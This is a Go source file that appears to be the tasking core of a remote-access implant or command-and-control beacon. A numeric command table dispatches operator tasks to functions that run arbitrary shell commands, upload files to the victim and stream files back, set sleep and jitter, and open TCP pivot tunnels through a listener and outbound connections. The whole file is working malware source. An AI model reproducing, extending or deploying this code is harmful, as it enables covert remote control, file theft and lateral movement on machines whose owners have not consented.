package core

import (
	"bytes"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"
)

var (
	TK = map[int]func([]byte) {
		2:  SHELL,
		3:  EXIT,
		4:  SLEEP,
		5:  CD,
		10: UPLOAD,
		11: DOWNLOAD,
		19: CANCEL,
		22: TRANSIT,
		23: UNLINK,
		39: PWD,
		51: PORTSTOP,
		67: UPLOADA,
		82: REVERSE,
		86: CONNECT,
	}
	_PIPE_ sync.Map
	Tunnel sync.Map
	Listen sync.Map
)

func SHELL(Data []byte) {
	var Buf bytes.Buffer
	Path := "/bin/sh"
	Args := []string{"-c", string(Data)}
	if runtime.GOOS == "windows" {
		Path = os.Getenv("COMSPEC")
		Args = []string{"/c", string(Data)}
	}
	CMD := exec.Command(Path, Args...)
	CMD.Stdout = &Buf
	CMD.Stderr = CMD.Stdout
	if err := CMD.Start(); err == nil {
		go CMD.Wait()
		_PIPE_.Store(CMD, &Buf)
	}
}

func EXIT(Data []byte) {
	TRUE = false
	MakeBytes(26, nil)
}

func SLEEP(Data []byte) {
	Sleep  = ByteToInt(Data[:4])
	Jitter = ByteToInt(Data[4:8])
}

func CD(Data []byte) {
	err := os.Chdir(string(Data))
	if err != nil { ERROR(err) }
}

func UPLOAD(Data []byte) {
	Len  := ByteToInt(Data[:4])
	Path := string(Data[4:4+Len])
	err  := os.WriteFile(Path, Data[4+Len:], 0755)
	if err != nil { ERROR(err) }
}

func DOWNLOAD(Data []byte) {
	Path := string(Data)
	Info, err := os.Stat(Path)
	if err == nil && !Info.IsDir() {
		FID := RandInt(100000000, 999999999)
		Len := IntToByte(4, int(Info.Size()))
		File, _ := os.Open(Path)
		_PIPE_.Store(FID, File)
		MakeBytes(2, IntToByte(4, FID), Len, Data)
	} else {
		ERROR(fmt.Errorf("Could not open " + Path))
	}
}

func CANCEL(Data []byte) {
	ID := ByteToInt(Data)
	if File, OK := _PIPE_.Load(ID); OK {
		File.(*os.File).Close()
		_PIPE_.Delete(ID)
		MakeBytes(9, Data)
	}
}

func TRANSIT(Data []byte) {
	if Conn, OK := Tunnel.Load(ByteToInt(Data[:4])); OK {
		_, err := Conn.(net.Conn).Write(JoinBytes([]byte(TCP_Header), IntAsByte(4, len(Data[4:])), Data[4:]))
		if err != nil { UNLINK(Data[:4]); return }
		ReadFrom(Conn.(net.Conn), len(TCP_Header))
		Len := ByteAsInt(ReadFrom(Conn.(net.Conn), 4))
		Buf := ReadFrom(Conn.(net.Conn), Len)
		MakeBytes(12, Data[:4], Buf)
	}
}

func UNLINK(Data []byte) {
	ID := ByteToInt(Data)
	if Conn, OK := Tunnel.Load(ID); OK {
		Conn.(net.Conn).Close()
		Tunnel.Delete(ID)
		MakeBytes(11, Data)
	}
}

func PWD(Data []byte) {
	dir, err := os.Getwd()
	if err != nil {
		ERROR(err)
	} else {
		MakeBytes(19, []byte(dir))
	}
}

func PORTSTOP(Data []byte) {
	Port := ByteToInt(Data)
	if ln, OK := Listen.Load(Port); OK {
		ln.(net.Listener).Close()
		Listen.Delete(Port)
	}
}

func UPLOADA(Data []byte) {
	Len  := ByteToInt(Data[:4])
	Path := string(Data[4:4+Len])
	File, _ := os.OpenFile(Path, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0755)
	defer File.Close()
	_, err := File.Write(Data[4+Len:])
	if err != nil { ERROR(err) }
}

func REVERSE(Data []byte) {
	Port := ByteToInt(Data)
	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", Port))
	if err != nil { ERROR(err); return }
	Listen.Store(Port, ln)
	go func() {
		for OK := true; OK; _, OK = Listen.Load(Port) {
			Conn, err := ln.Accept()
			if err != nil { continue }
			ReadFrom(Conn, len(TCP_Header))
			Len := ByteAsInt(ReadFrom(Conn, 4))
			if Len != 132 { Len = -1 }
			Buf := ReadFrom(Conn, Len)
			if Buf == nil { Conn.Close(); continue }
			_PIPE_.Store(string(Buf[:4]), Buf[4:])
			Tunnel.Store(ByteAsInt(Buf[:4]), Conn)
		}
	}()
}

func CONNECT(Data []byte) {
	Host := string(Data[2:len(Data)-1])
	Addr := fmt.Sprintf("%s:%d", Host, ByteToInt(Data[:2]))
	Conn, err := net.DialTimeout("tcp", Addr, 10*time.Second)
	if err != nil { ERROR(err); return }
	ReadFrom(Conn, len(TCP_Header))
	Len := ByteAsInt(ReadFrom(Conn, 4))
	if Len != 132 { Len = -1 }
	Buf := ReadFrom(Conn, Len)
	if Buf == nil { Conn.Close(); return }
	Tunnel.Store(ByteAsInt(Buf[:4]), Conn)
	MakeBytes(10, LittleToBig(Buf[:4]), IntToByte(4, 1048576), Buf[4:])
}

func ERROR(err error) {
	MakeBytes(13, []byte(err.Error()))
}

func HOOK(Key, Value interface{}) bool {
	if PID, OK := Key.(*exec.Cmd); OK {
		Buf := Value.(*bytes.Buffer)
		if Buf.Len() > 0 {
			MakeBytes(30, Buf.Next(4096))
		} else {
			if PID.ProcessState != nil {
				_PIPE_.Delete(PID)
			}
		}
	}
	if FID, OK := Key.(int); OK {
		Buf := make([]byte, 262144)
		Num, err := Value.(*os.File).Read(Buf)
		if err != nil {
			CANCEL(IntToByte(4, FID))
		} else {
			MakeBytes(8, IntToByte(4, FID), Buf[:Num])
		}
	}
	if BID, OK := Key.(string); OK {
		_PIPE_.Delete(BID)
		MakeBytes(10, LittleToBig([]byte(BID)), IntToByte(4, 1114112), Value.([]byte))
	}
	return true
}